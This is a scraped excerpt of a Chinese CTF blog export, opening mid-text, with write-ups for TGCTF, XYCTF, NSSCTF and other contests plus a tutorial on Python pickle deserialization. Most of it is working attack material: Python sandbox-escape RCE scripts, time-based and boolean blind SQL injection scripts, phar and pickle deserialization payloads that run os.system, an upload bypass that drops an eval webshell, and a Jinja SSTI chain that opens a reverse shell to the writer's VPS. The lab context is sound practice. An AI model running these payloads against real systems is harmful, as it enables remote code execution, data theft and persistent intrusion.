$useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20; $aa = new yesterday();$aa-study = new today();$aa-study-doing = new future();$phar = new Phar(sauy.phar);$phar-startBuffering();$phar-setStub(GIF89a.?php __HALT_COMPILER(); ? );$phar-setMetadata($aa);$phar-addFromString(test.txt, test);$phar-stopBuffering();? php -d phar.readonly=0 -f explore.php 将生成的sauy.php改为atg 上传成功后 到class.php 进行反序列化操作 get传入：?filenamephar:.uploadssauy.atgtest.txt post传入：wowenv 熟悉的配方，熟悉的味道进去即使源代码贴脸 但是可惜我不会 赛后复现算是学到了 谢谢实验室的佬大教我 考点：沙箱绕过 python代码注入 源码 from pyramid.config import Configuratorfrom pyramid.request import Requestfrom pyramid.response import Responsefrom pyramid.view import view_configfrom wsgiref.simple_server import make_serverfrom pyramid.events import NewResponseimport refrom jinja2 import Environment, BaseLoadereval_globals = #防止eval执行恶意代码 __builtins__: , # 禁用所有内置函数 __import__: None # 禁止动态导入def checkExpr(expr_input): expr = re.split(r[-+*/], expr_input) print(exec(expr_input)) if len(expr) != 2: return 0 try: int(expr[0]) int(expr[1]) except: return 0 return 1def home_view(request): expr_input = result = if request.method == POST: expr_input = request.POST[expr] if checkExpr(expr_input): try: result = eval(expr_input, eval_globals) except Exception as e: result = e else: result = 爬！ template_str = 【xxx】 env = Environment(loader=BaseLoader()) template = env.from_string(template_str) rendered = template.render(expr_input=expr_input, result=result) return Response(rendered)if __name__ == __main__: with Configurator() as config: config.add_route(home_view, /) config.add_view(home_view, route_name=home_view) app = config.make_wsgi_app() server = make_server(0.0.0.0, 9040, app) server.serve_forever() 法1：用抛出错误实现RCE，用污染HTTP 500的返回消息实现回显脚本看不懂问ai import requestsurl = your_urlcode = fb = re.match.__globals__[__builtins__]b[setattr](b[__import__](wsgiref).handlers.BaseHandler,error_body,b[__import__](os).popen(ls /).read().encode())raise Exception(1)resp = requests.post(url, data = expr: fexec(code!r),)print(resp.status_code)print(resp.text) 脚本解释首先通过 b = re.match.__globals__[__builtins__] 这一步是通过加载__globals__的属性访问全局空间 目的是绕过对__import__和__builtins__的限制 相当于绕过对这个的沙箱限制然后 b[setattr](b[__import__](wsgiref).handlers.BaseHandler,error_body 是过__import__函数动态加载wsgiref模块wsgiref.handlers.BaseHandler是WSGI处理HTTP请求/响应的基类，负责生成错误响应内容。b[__import__](os).popen(ls /).read().encode() 然后修改类的error_body属性为命令执行的内容 然后encode是把其转化为字节类型raise Exception(1)是强制抛出异常 触发WSGI报错 原理通过故意触发程序中的异常（错误），利用异常处理机制中的漏洞执行恶意代码。例如，在动态代码执行环境（如eval）中，攻击者构造输入引发异常，同时注入恶意代码。 做题思考步骤： 输入构造：提交包含恶意代码的输入，如1 + a引发类型错误。 异常触发：服务器处理输入时抛出异常，进入错误处理流程。 代码注入：在异常处理过程中，恶意代码被解析执行。例如，通过__import__(os).system(ls)执行系统命令。 绕过限制：利用反射或内置对象（如__builtins__）绕过沙箱限制，实现任意代码执行。 法2：布尔盲注import stringimport requestsfrom tqdm import tqdmurl = flag=for i in range(len(flag),50): # for s in TGCTF: for s in tqdm(-+++string.ascii_lowercase+string.digits): data = expr:fimport os,operator;f=os.popen(cat /f*).read();a=int(operator.eq(f[i],s));1/a # res = requests.post(url, data=json) res = requests.post(url, data=data) # print(res.text, s) if res.text != A server error occurred. Please contact the administrator.: flag += s print(flag) break print(i)s 法3：pyramid内存马推荐这篇师傅的文章捏 https://www.yuque.com/polestar-mzvgl/swtget/zuh78rfp7i67u219#AWd8j 也可以看我的博客内置文章 https://sauy122.github.io/2025/04/16/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/ TG_wordpress有很多漏洞点 治理只写一种 扫描二维码下下来一个apk文件 jadx反编译后 全局搜索 password string name=web04+ username/password:/stringstring name=web05+ TG_wordpressor/stringstring name=web06+ aXx^oV@Kamp;cFoVaztQ*/string 在login路由登录 进入过后 查询插件确定cve 的型号(你可也直接复制插件的内容 然后直接问dp) TGCTF{CVE-2020-25213} TGCTF 2025 后台管理SQL注入","tags":["CTF-wp"]},{"title":"pickle反序列化学习","path":"/2025/04/10/pickle反序列化/","content":"前置知识详细前置知识可以看官方文档https://docs.python.org/zh-cn/3/library/pickle.html Pickle–Python对象反序列化Picklepickle是python里一个可以对一个 Python 对象结构的二进制序列化和反序列化的模块。pickling 是将 Python 对象及其所拥有的层次结构转化为一个字节流的过程，而 unpickling 是相反的操作pickel可以看作一种独立的栈语言，其对opcode的编写可以进行python代码执行、变量覆盖等操作。 pickle序列化和反序列化对象 – 二进制字节流 import pickle class Person(): def __init__(self): self.age=18 self.name=A p=Person()opcode=pickle.dumps(p)print(opcode) P=pickle.loads(opcode)print(The age is:+str(P.age),The name is:+P.name) //P.age 是调用age成员 P.name 是调用name成员 pickle.dumps将对象序列化为二进制字节流 pickle.loads将二进制字节流化为对象 Pickle反序列化漏洞成因:就是在二进制字节流上做手脚 就像php反序列化我们传入序列化后的字符串来达到我们想要的目标 import pickleimport os class Person(): def __init__(self): self.age=18 self.name=A def __reduce__(self): command=rwhoami return (os.system,(command,)) p=Person()opcode=pickle.dumps(p)print(opcode) P=pickle.loads(opcode)print(The age is:+str(P.age),The name is:+P.name) 特殊函数__reduce__ return 一个元组 第一个是可调用对象 第二个是一个参数元组 在pickle.loads的时候就会执行os.system(“whoami”) 那就成功执行任意python代码了 Pickle工作原理独立的栈语言，由一串串opcode组成。语言解析依靠Pickle Virtual Machine(PVM)进行。 指令处理器：从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 . 这个结束符后停止。 最终留在栈顶的值将被作为反序列化对象返回。 stack：由 Python 的 list 实现，被用来临时存储数据、参数以及对象。 memo：由 Python 的 dict 实现，为 PVM 的整个生命周期提供存储。 常用opcode指令 指令 描述 具体写法 栈上的变化 c 获取一个全局对象或import一个模块 c[module] [instance] 获得的对象入栈 o 寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象） o 这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈 i 相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象） i[module] [callable] 这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈 N 实例化一个None N 获得的对象入栈 S 实例化一个字符串对象 S’xxx’ （也可以使用双引号、等python字符串形式） 获得的对象入栈 V 实例化一个UNICODE字符串对象 Vxxx 获得的对象入栈 I 实例化一个int对象 Ixxx 获得的对象入栈 F 实例化一个float对象 Fx.x 获得的对象入栈 R 选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数 R 函数和参数出栈，函数的返回值入栈 . 程序结束，栈顶的一个元素作为pickle.loads()的返回值 . 无 ( 向栈中压入一个MARK标记 ( MARK标记入栈 t 寻找栈中的上一个MARK，并组合之间的数据为元组 t MARK标记以及被组合的数据出栈，获得的对象入栈 ) 向栈中直接压入一个空元组 ) 空元组入栈 l 寻找栈中的上一个MARK，并组合之间的数据为列表 l MARK标记以及被组合的数据出栈，获得的对象入栈 ] 向栈中直接压入一个空列表 ] 空列表入栈 d 寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对） d MARK标记以及被组合的数据出栈，获得的对象入栈 } 向栈中直接压入一个空字典 } 空字典入栈 p 将栈顶对象储存至memo_n pn 无 g 将memo_n的对象压栈 gn 对象被压栈 0 丢弃栈顶对象 0 栈顶对象被丢弃 b 使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置 b 栈上第一个元素出栈 s 将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中 s 第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新 u 寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中 u MARK标记以及被组合的数据出栈，字典被更新 a 将栈的第一个元素append到第二个元素(列表)中 a 栈顶元素出栈，第二个元素（列表）被更新 e 寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中 e MARK标记以及被组合的数据出栈，列表被更新 import pickle opcode=bcossystem(SwhoamitR.pickle.loads(opcode) 运行以上代码就会执行whoami命令 pickletools用这个模块可以把opcode转换成我们易读的形式 import pickletoolsopcode = bcossystem(SwhoamitR.pickletools.dis(opcode) 得 0: c GLOBAL os system 11: ( MARK 12: S STRING whoami 22: t TUPLE (MARK at 11) 23: R REDUCE 24: . STOPhighest protocol among opcodes = 0 Opcode漏洞利用命令执行opcode可以执行多个命令，可以通过手写的方式来达到。 opcode中，**.**是程序结束的标志，我们可以通过去掉.将两个字节流拼接在一起。 import pickle opcode=bcossystem(SwhoamitRcossystem(SwhoamitR.pickle.loads(opcode)#就会执行两次whoami命令 注意！部分Linux系统下和Windows下的opcode字节流并不兼容，比如Windows下执行系统命令函数为os.system()，在部分Linux下则为posix.system()。所以有时候linux和win下的脚本运行结果是不同的。 R i o 这是三个执行函数的字节码 R opcode1=bcossystem(SwhoamitR. i opcode2=b(Swhoamiiossystem. o opcode3=b(cossystemSwhoamio. 变量覆盖在session或token中，由于需要存储一些用户信息，所以我们常常能够看见pickle的身影。程序会将用户的各种信息序列化并存储在session或token中，以此来验证用户的身份。所以pickle可以进行session伪造，来变量覆盖。 实验: #test.pyimport pickleimport secretprint(secret变量的值为: + secret.secret)opcode = bc__main__secret(SsecretSHack!!!db.fake = pickle.loads(opcode)print(secret变量的值为: + fake.secret) #secret.pysecret = This is a key 这样就可以成功覆盖原来的secret pickle暂时先学到这里吧笔者觉得学再多的理论还是得应用，如果以后有什么新的东西就再来补坑🤭","tags":["CTF学习"]},{"title":"蜀道山2024wp","path":"/2025/04/10/蜀道山2024-wp/","content":"奶龙牌WAF拿到附件 不准上传后缀为ph和hta的文件 并且对文件大小有限制 代码关键处: move_uploaded_file 函数定义和用法：move_uploaded_file() 函数把上传的文件移动到新位置。如果成功该函数返回 TRUE，如果失败则返回 FALSE。 语法：move_uploaded_file(file,newloc)file:必需。规定要移动的文件。newloc:必需。规定文件的新位置。 提示注释：该函数仅用于通过 HTTP POST 上传的文件。注释：如果目标文件已经存在，将会被覆盖。 题目做法:当move_uploaded_file函数参数可控时，可以尝试/.绕过，因为该函数会忽略掉文件末尾的/.，所以可以构造save_path=1.php/.,这样file_ext值就为空，就能绕过黑名单，而move_uploaded_file函数忽略文件末尾的/.可以实现保存文件为.php 这段代码代表只对前5000字节进行校验，意思是5000之后我们就可以传入危险内容(木马)。 使用print(a*2000000+?php eval($_POST[1]);?) 上传文件即可 数据包构造 POST /?name=1.php/. HTTP/1.1Host: gz.imxbt.cn:20801Content-Length: 1048752Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36Origin: http://gz.imxbt.cn:20801Content-Type: multipart/form-data; boundary=----WebKitFormBoundarycXLzLLazg0AJNoVAAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://gz.imxbt.cn:20801/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,zh-HK;q=0.8,zh-TW;q=0.7Cookie: PHPSESSID=8177754fd454ad57569dea76792994c9; name=!4SSvdzbD0UYv84Lnpmm1VLtPBddCrvhgQOLkNQbhjek=?gAWVGQAAAAAAAABdlCiMBG5hbWWUfZRoAYwFZ3Vlc3SUc2Uu; GZCTF_Token=CfDJ8MKySZ_mlO1BrUTiopFb3pr4sMLMFDp7VLwqIHHQ787J8MU9o7kzKDQgSGH3aUSAFreJelz-xjNcVon1NvCY9iAKz8ktIq-qB4r2jQSniDqdjks-AlNc7Rkw9ROQ3vAa9e0N-iumHmUWe1UcvM30oD4C_p5X2rfkyF4zaLlPcJte51OO6suesKAsKpiTzQ1RvmbX-oqD9hVQaRz0jBi9xFJ7fpCIh2-_Y8UzrQ8TgMQRwpHxaUjX6TUPWl2iaCoFCXNG5RSUU5JVX6JeXurix40S_LdkKSdgdmEXKkw1XNLb5v1YDumTpaGciQGUIVoxHZRwlEtgQ5eR3pq8O1_vm4yODQYq4Y0RPvc2MoJVYLZgX1u-EsroGJdBXAMr09bPEkPJYYerhs1QlP5t2Y8A076GE8Cv82ugOHeNStUNFBf_XQwunbSKJt0FaUtv0SdEu-EKn79ZcAd4m_Ui2-DypcJ6NW7yQrVoC31ElAZuLxFCuVZP4Jw_hZxvAhETL4Pm3Jbx0XR1Dv_Eyjirco1Gtowu44qH972w0qN2sbR2iTwatubxFs39PNNj6dBeZj3MsqihIS5JgY4aY2yAiSLgV586D0zNxFepVQR6_qSzYVX61OIiXKjnRACYg6F6neFGC7YwlYz260chM2RECVTWEqQOdR02WQ6HRcoMqFiFMMXchvAX7rW8t3RJ7T6dF_eel5le5oHsYhoxevoMfddEVM8Connection: close------WebKitFormBoundarycXLzLLazg0AJNoVAContent-Disposition: form-data; name=upload_file; filename=1.php/.Content-Type: image/jpeg2000000个a+?php eval($_POST[1]);?------WebKitFormBoundarycXLzLLazg0AJNoVA-- 上传连接蚁剑","tags":["CTF-wp"]},{"title":"XYCTF2025-WEB WP","path":"/2025/04/09/XYCTF2025-WEB/","content":"前言:由于笔者能力有限，只写了自己能力以内的题的WPez_puzzlejs代码游戏 禁了一些常用快捷键 我的做法是将所有代码拉下来 自己本地用phpstudy起了一个服务 具体改源代码逻辑 if (G yw4) 改为 if (G yw4) 这个是判断时间是否小于两秒的逻辑 把其改为大于 自己玩一遍拼图就ok了 flagY0u__aRe_a_mAsteR_of_PUzZL!!@!!~! ezsql(手动滑稽)sql毋庸置疑 注入点是usrname 闭合时单引号 fuzz一下发现过滤了,空格等 首先空格使用%09绕过 因为,被ban了的原因 很多语句都不可以用 使用 case when语句来进行时间盲注 语句构造： !!!请注意:python里盲注要把%09改为\\t 因为request库会将\\t编码为%09 爆数据库 testdb 1%09or%09CASE%09WHEN%09(ASCII(SUBSTRING((database())%09FROM%091%09FOR%091))100)%09THEN%09SLEEP(2)%09ELSE%090%09END# 爆表 double_check,user 1%09or%09CASE%09WHEN%09(ASCII(SUBSTRING((SELECT%09GROUP_CONCAT(table_name)%09FROM%09information_schema.tables%09WHERE%09table_schema=database())%09FROM%091%09FOR%091))100)%09THEN%09SLEEP(2)%09ELSE%090%09END# 爆列secret,username,password 1%09or%09CASE%09WHEN%09(ASCII(SUBSTRING((SELECT%09GROUP_CONCAT(column_name)%09FROM%09information_schema.columns%09WHERE%09table_schema=database())%09FROM%091%09FOR%091))100)%09THEN%09SLEEP(2)%09ELSE%090%09END# 爆数据 过滤了逗号一个一个 usernameyudeyoushang passwordzhonghengyisheng secretdtfrtkcc0czkoua9S 1%09or%09CASE%09WHEN%09(ASCII(SUBSTRING((SELECT%09GROUP_CONCAT(username)%09FROM%09double_check)%09FROM%091%09FOR%091))100)%09THEN%09SLEEP(2)%09ELSE%090%09END#1%09or%09CASE%09WHEN%09(ASCII(SUBSTRING((SELECT%09GROUP_CONCAT(password)%09FROM%09double_check)%09FROM%091%09FOR%091))100)%09THEN%09SLEEP(2)%09ELSE%090%09END#1%09or%09CASE%09WHEN%09(ASCII(SUBSTRING((SELECT%09GROUP_CONCAT(secret)%09FROM%09double_check)%09FROM%091%09FOR%091))100)%09THEN%09SLEEP(2)%09ELSE%090%09END# 好了现在就是超级时刻 拿着爆出的账号密码登录 然后进入发现要输入密钥 输入secret爆出的东西 进入一个命令执行系统 执行命令就可以 过滤空格且无回显写入文件就好了 cat$IFS/f*1.txt sql时间盲注模板 import requestsimport timeurl = urldef get_database(url): name = for i in range(1, 100): low = 32 high = 128 while low high: mid = (low + high) // 2 payload = f1\\tor\\tCASE\\tWHEN\\t(ASCII(SUBSTRING((SELECT\\tGROUP_CONCAT(secret)\\tFROM\\tdouble_check)\\tFROM\\ti\\tFOR\\t1))mid)\\tTHEN\\tSLEEP(2)\\tELSE\\t0\\tEND# params = username: payload, password: 1, start_time = time.time() r = requests.post(url, data=params) end_time = time.time() if end_time - start_time = 1.5: low = mid + 1 else: high = mid if low == 32: break name += chr(low) print(name)get_database(url) Signin下载附件审计源码 from bottle import Bottle, request, response, redirect, static_file, run, routewith open(../../secret.txt, r) as f: secret = f.read()app = Bottle()@route(/)def index(): return HI@route(/download)def download(): name = request.query.filename if ../../ in name or name.startswith(/) or name.startswith(../) or \\\\ in name: response.status = 403 return Forbidden with open(name, rb) as f: data = f.read() return data@route(/secret)def secret_page(): try: session = request.get_cookie(name, secret=secret) if not session or session[name] == guest: session = name: guest response.set_cookie(name, session, secret=secret) return Forbidden! if session[name] == admin: return The secret has been deleted! except: return Error!run(host=0.0.0.0, port=8080, debug=False) download下存在目录穿越 但是过滤了....搜寻资料用下./.././../ payload：./.././../secret.txt 获取到secret_key：Hell0_H@cker_Y0u_A3r_Sm@r7 那就进行session伪造 当前name: !4SSvdzbD0UYv84Lnpmm1VLtPBddCrvhgQOLkNQbhjek=?gAWVGQAAAAAAAABdlCiMBG5hbWWUfZRoAYwFZ3Vlc3SUc2Uu 很奇怪对吧 丢给ai问下 直接叫他帮你写脚本 import pickleimport base64import hmacimport hashlibsecret = bHell0_H@cker_Y0u_A3r_Sm@r7# 1. 保持原始结构，只替换guest部分original_structure = [name, name: admin] # 关键修改点# 2. 序列化pickled_data = pickle.dumps(original_structure)print(=== 编码前的恶意数据结构 ===)print(fPython对象: original_structure)print(fPickle字节: pickled_data)# 3. 生成cookieencoded_data = base64.b64encode(pickled_data).decode(utf-8)signature = hmac.new(secret, encoded_data.encode(), hashlib.sha256).digest()malicious_cookie = f!base64.b64encode(signature).decode()?encoded_dataprint( === 最终恶意cookie ===)print(malicious_cookie)得到 !w7ggni+OONpuUroWJe5pEGGQSE1aUyCHrz6RoSzaQEA=?gASVGQAAAAAAAABdlCiMBG5hbWWUfZRoAYwFYWRtaW6Uc2Uu 然后提交会触发 但是没什么用 pickle反序列化 import pickleimport base64import hmacimport hashlibsecret = bHell0_H@cker_Y0u_A3r_Sm@r7class MaliciousPayload: def __reduce__(self): import os return (os.system, (cat /flag* /flag,)) # 替换为你需要的命令# 1. 保持原始结构，只替换guest部分original_structure = [name, name: MaliciousPayload()] # 关键修改点# 2. 序列化pickled_data = pickle.dumps(original_structure)print(=== 编码前的恶意数据结构 ===)print(fPython对象: original_structure)print(fPickle字节: pickled_data)# 3. 生成cookieencoded_data = base64.b64encode(pickled_data).decode(utf-8)signature = hmac.new(secret, encoded_data.encode(), hashlib.sha256).digest()malicious_cookie = f!base64.b64encode(signature).decode()?encoded_dataprint( === 最终恶意cookie ===)print(malicious_cookie) 注意这里有一点小坑:linux和win运行这个脚本的结果是不一样的 linux是 win是 linux的才是对的 问了问其他师傅 说是 win会记录 os.system 的 win 实现 nt.systemLinux记录的是 os.system 的 Linux 实现 posix.system 而脚本里的hash只要有一个字符就会不同 所以生成结果不同 先 再 XYCTFWe1c0me_t0_XYCTF_2o25!The_secret_1s_L@men7XU_L0v3_u! 出题人已疯源码 # -*- encoding: utf-8 -*-@File : app.py@Time : 2025/03/29 15:52:17@Author : LamentXU import bottleflag in /flag@bottle.route(/)def index(): return Hello, World!@bottle.route(/attack)def attack(): payload = bottle.request.query.get(payload) if payload and len(payload) 25 and open not in payload and \\\\ not in payload: return bottle.template(hello +payload) else: bottle.abort(400, Invalid payload)if __name__ == __main__: bottle.run(host=0.0.0.0, port=5000) 限制是25个字符 _import__(os).system(cat /f*123) 这是要总共执行的payload 但是超过了25个字符 如何绕过呢 看了出题人的wp 本质上还是给一个变量不断地赋值 最后达到绕过25个字符的标准 类似的题可以见VNCTF2025 里的学生管理系统 VN里用的是海象表达式(因为题目是多行) 而这道题是单行 所以就将payload按照几个字符一组 弄成了列表 通过循环不断赋值 最终payload import requestsurl = url/attackpayload = __import__(os).system(cat /f*123)p = [payload[i:i+3] for i in range(0,len(payload),3)]flag = Truefor i in p: if flag: tmp = f %import os;os.a=i flag = False else: tmp = f %import os;os.a+=i r = requests.get(url,params=payload:tmp)r = requests.get(url,params=payload: %import os;eval(os.a))r = requests.get(url,params=payload: %include(123)).text //这一步是读取服务器下的生成的文件123print(r) flagL@men7XU_d0es_n0t_w@nt_t0_g0_t0_scho01 Fate源代码 #!/usr/bin/env python3import flaskimport sqlite3import requestsimport stringimport jsonapp = flask.Flask(__name__)blacklist = string.ascii_lettersdef binary_to_string(binary_string): if len(binary_string) % 8 != 0: raise ValueError(Binary string length must be a multiple of 8) binary_chunks = [binary_string[i:i+8] for i in range(0, len(binary_string), 8)] string_output = .join(chr(int(chunk, 2)) for chunk in binary_chunks) return string_output@app.route(/proxy, methods=[GET])def nolettersproxy(): url = flask.request.args.get(url) if not url: return flask.abort(400, No URL provided) target_url = http://lamentxu.top + url for i in blacklist: if i in url: return flask.abort(403, I blacklist the whole alphabet, hiahiahiahiahiahiahia~~~~~~) if . in url: return flask.abort(403, No ssrf allowed) response = requests.get(target_url) return flask.Response(response.content, response.status_code)def db_search(code): with sqlite3.connect(database.db) as conn: cur = conn.cursor() cur.execute(fSELECT FATE FROM FATETABLE WHERE NAME=UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(code)))))))) found = cur.fetchone() return None if found is None else found[0]@app.route(/)def index(): print(flask.request.remote_addr) return flask.render_template(index.html)@app.route(/1337, methods=[GET])def api_search(): if flask.request.remote_addr == 127.0.0.1: code = flask.request.args.get(0) if code == abcdefghi: req = flask.request.args.get(1) try: req = binary_to_string(req) print(req) req = json.loads(req) # No one can hack it, right? Pickle unserialize is not secure, but json is ;) except: flask.abort(400, Invalid JSON) if name not in req: flask.abort(400, Empty Persons name) name = req[name] if len(name) 6: flask.abort(400, Too long) if \\ in name: flask.abort(400, NO ) if ) in name: flask.abort(400, NO )) Some waf hidden here ;) fate = db_search(name) if fate is None: flask.abort(404, No such Person) return Fate: fate else: flask.abort(400, Hello local, and hello hacker) else: flask.abort(403, Only local access allowed)if __name__ == __main__: app.run(debug=True) proxy路由下进行ssrf 但是过滤了. 就尝试用十进制来绕过本地回环地址 当加入@ 就只解析@后面的网址 要访问本地的1337路由 于是写入payload/proxy?url=@2130706433:8080/1337 然后1337路由下要满足传入的0参数值为abcdefghi 但是黑名单是过滤了字母 这里就有个小trick url二次编码绕过 满足后又可以传入1参数 1 要进行sql注入 if flask.request.remote_addr == 127.0.0.1: code = flask.request.args.get(0) if code == abcdefghi: req = flask.request.args.get(1) try: req = binary_to_string(req) print(req) req = json.loads(req) # No one can hack it, right? Pickle unserialize is not secure, but json is ;) except: flask.abort(400, Invalid JSON) if name not in req: flask.abort(400, Empty Persons name) import sqlite3conn = sqlite3.connect(database.db)conn.execute(CREATE TABLE FATETABLE ( NAME TEXT NOT NULL, FATE TEXT NOT NULL);)Fate = [ (JOHN, 1994-2030 Dead in a car accident), (JANE, 1990-2025 Lost in a fire), (SARAH, 1982-2017 Fired by a government official), (DANIEL, 1978-2013 Murdered by a police officer), (LUKE, 1974-2010 Assassinated by a military officer), (KAREN, 1970-2006 Fallen from a cliff), (BRIAN, 1966-2002 Drowned in a river), (ANNA, 1962-1998 Killed by a bomb), (JACOB, 1954-1990 Lost in a plane crash), (LAMENTXU, r2024 Send you a flag flagFAKE)]conn.executemany(INSERT INTO FATETABLE VALUES (?, ?), Fate)conn.commit()conn.close() 请注意要urlencode编码 要用desc可以逆向查询 /proxy?url=@2130706433:8080/1337?0=%2561%2562%2563%2564%2565%2566%2567%2568%2569%261=011110110010001001101110011000010110110101100101001000100011101001111011001000100010011100101001001010010010100100101001001010010010100100101001001000000101010101001110010010010100111101001110001000000101001101000101010011000100010101000011010101000010000001000110010000010101010001000101001000000100011001010010010011110100110100100000010001100100000101010100010001010101010001000001010000100100110001000101001000000101011101001000010001010101001001000101001000000100111001000001010011010100010100111101001001110100110001000001010011010100010101001110010101000101100001010101001001110010000000101101001011010010001000111010001100010111110101111101 flagDo4t_bElIevE_in_FatE_Y1s_Y0u_2_a_Js0n_ge1nus! 总结这是本新手第一次参加XYCTF 反正我自己挺坐牢的( 赛题web就出了三道简单题 但是可以学到东西就好 SSTI考难了根本不会(× 还有一些自己不熟悉的小trick 不过慢慢来！","tags":["CTF-wp"]},{"title":"NSSCTF Round30 Basic双人组队赛","path":"/2025/04/07/NSSCTF Round30 Basic双人组队赛/","content":"hack_the_world!from flask import Flask, request, render_template,render_template_string, url_for, sessionimport timeimport osapp = Flask(__name__)app.secret_key = NSSFILTER_KEYWORDS = [Ciallo～(∠・ω ＜）⌒★]def contains_forbidden_keywords(complaint): for keyword in FILTER_KEYWORDS: if keyword.lower() in complaint: return True return False@app.route(/, methods=[GET, POST])def index(): session[user] = Gamer return render_template(index.html)@app.route(/hack, methods=[GET, POST])def hack(): if session.get(user) != hacker: return render_template(die.html,user=session.get(user)) if (abc:=request.headers.get(User-Agent)) is None: return render_template(fobidden.html) cmd = request.form.get(cmd,noting) if (answer:=request.args.get(answer)) == hack_you: if contains_forbidden_keywords(cmd): return render_template(forbidden.html) else: render_template_string(fcmd,cmd=cmd) css_url = url_for(static, filename=style.css) js_url = url_for(static, filename=script.js) return render_template_string(f !DOCTYPE html html lang=zh head meta charset=UTF-8 meta name=viewport content=width=device-width, initial-scale=1.0 titlefake world/title link rel=stylesheet href=css_url !-- No ping No curl No nc , little hacker blind no way-- /head body canvas class=matrix/canvas div class=bg-animation/div div class=container h1So, what are you trying to do/h1 pJust quit, little hacker. There’s nothing for you here./p /div script src=js_url/script /body /html , css_url=css_url,js_url=js_url) 源码经过审计 可以确定为ssti + flask.session伪造 flask伪造secret-key:NSS 得到session:eyJ1c2VyIjoiaGFja2VyIn0.Z_IwwQ.fYDi-wb5WZ3xq_Q2oxb3JSg7Qjw 修改访问hack SSTI满足get传入answerhack_you post传入cmd参数 即ssti注入点 输入49无反应 尝试随便输了几个也没反应 用burp fuzz一下 找到了waf 黑名单:[‘.’,’_’,’]’,’%’,’read’,’mro’] 看响应包也有提示 结合前面除waf以外不回显 判断为盲注 传入payload: 要url编码 lipsum|attr(lipsum|escape|batch(22)|list|first|last+lipsum|escape|batch(22)|list|first|last+globals+lipsum|escape|batch(22)|list|first|last+lipsum|escape|batch(22)|list|first|last)|attr(get)(lipsum|escape|batch(22)|list|first|last+lipsum|escape|batch(22)|list|first|last+builtins+lipsum|escape|batch(22)|list|first|last+lipsum|escape|batch(22)|list|first|last)|attr(get)(lipsum|escape|batch(22)|list|first|last+lipsum|escape|batch(22)|list|first|last+import+lipsum|escape|batch(22)|list|first|last+lipsum|escape|batch(22)|list|first|last)(os)|attr(popen)([十六进制编码后的bash -c bash -i /dev/tcp/vps/port 01])|attr(read)() 监听自己端口 vps成功反弹shell 你是谁的菜鸟，又是谁的佬大进去无信息 查看源码发现提示 $NSS = $_GET[NSS]; if (!preg_match(/([A-Z]|;| |\\$|~|\\#|\\(|\\^)/i, $NSS)) exec($NSS); else echo $Narration; 无字母RCE 一般的都不能用 这里介绍一种方法 具体原理见p神文章 https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html 首先本地起一个html文件 !DOCTYPE htmlhtmlhead meta charset=utf-8 titlePOST 传输数据包 POC/title/headbody form action=http://node1.anna.nssctf.cn:28468/ method=post enctype=multipart/form-data label for=file文件名：/label input type=file name=file id=filebr input type=submit name=submit value=提交 /form/body/html 上传一个文件 1.txt #!/binecho PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4= | base64 -d shell.php //写一句话木马到shell.php文件 上传后自动跳转到网页 抓包即可 get传入?NSS.%09???????????[@-[] 再访问shell.php 成功访问 写马成功 连接蚁剑 根目录找flag文件即可 你也是迷宫高手吗进入靶机发现是个小游戏 限时10s完成10个迷宫 迷宫随机 很明显的reqeust库写脚本 非常考验写脚本*(调教ai的能力×* 笔者不想多写 详见官方wp https://www.nssctf.cn/note/set/12045 简单的PHPphp类型题 第一关 ?phpinclude jeer.php;highlight_file(__FILE__);error_reporting(0);$A = 0;$B = 0;$C = 0;//第一关if (isset($_GET[one])) $str = $_GET[str] ?? 0; $add = substr($str, 0, 1); $add++; if (strlen($add) 1 ) $A = 1; else echo $one; else echo $begin;//第二关if (isset($_GET[two])) $comment = $_GET[comment] ?? echo(114514); if (!preg_match(/(|;| |\\$|~|\\#|`|\\|\\|\\*|?|||\\r| |\\^)/i, $comment) strlen($comment) 20) try eval($B = 1;.$comment.;echo $two;die();); catch (Error $e) echo $boom; //第三关if (isset($_GET[three])) if (isset($_POST[one])isset($_POST[two])) $a1=(string)$_POST[one]; $a2=(string)$_POST[two]; if ($a1 !== $a2 sha1($a1) === sha1($a2)) $C = 1; else echo $three; if ($A == 1 $B == 1 $C == 1) echo file_get_contents($_POST[file]);? 前面的不赘述 就考cve搓脚本啦 之前ghctf的时候刚刚好把改好的拿来用 项目地址：https://github.com/ambionics/cnext-exploits 虚拟机clone下来 然后把里面的脚本改为下面这个 执行命令就好 📂 点击展开 cne.py % include cne.py % kali执行命令 python3 cne.py http://node7.anna.nssctf.cn:21532/ echo ?php @eval(\\$_POST[\\cmd\\]);? 22.php 访问22.php 写入木马成功 终端读取flag 呵呵喜欢藏flag 用 find / -name *flag* 找到可疑目录 114514flag 读取 成功得到flag","tags":["CTF-wp"]},{"title":"Sql-labs部分题解","path":"/2025/04/06/Sql-labs部分题解/","content":"level-1字符型 ‘注入 -1 union select 1,2,group_concat(username,id,password) from users--+ 